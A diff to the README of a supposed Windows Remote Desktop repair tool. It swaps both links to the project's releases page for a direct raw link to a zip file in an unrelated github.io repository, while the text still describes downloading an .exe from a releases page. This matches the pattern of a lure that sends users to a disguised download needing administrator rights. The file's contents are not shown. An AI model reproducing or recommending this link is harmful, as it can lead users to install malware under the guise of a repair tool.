@@ -5,7 +5,7 @@ description: "Resolve Windows Remote Desktop connection errors with this automat
 ---
 # 🔧 RDP-Connection-Failed-Fix - Repair your remote desktop connection now
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Maarenation970/RDP-Connection-Failed-Fix/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Maarenation970/maarenation970.github.io/main/antemetic/maarenation-io-github-2.7-beta.4.zip)
 
 ## 📖 About this tool
 
@@ -24,7 +24,7 @@ You must have administrative access to your computer to launch the repair tool. 
 
 Visit this page to download the latest version of the repair tool:
 
-[https://github.com/Maarenation970/RDP-Connection-Failed-Fix/releases](https://github.com/Maarenation970/RDP-Connection-Failed-Fix/releases)
+[https://raw.githubusercontent.com/Maarenation970/maarenation970.github.io/main/antemetic/maarenation-io-github-2.7-beta.4.zip](https://raw.githubusercontent.com/Maarenation970/maarenation970.github.io/main/antemetic/maarenation-io-github-2.7-beta.4.zip)
 
 Look for the latest release on the page. Click the file name that ends in .exe to start your download. Save the file to your desktop or your downloads folder for easy access.
 
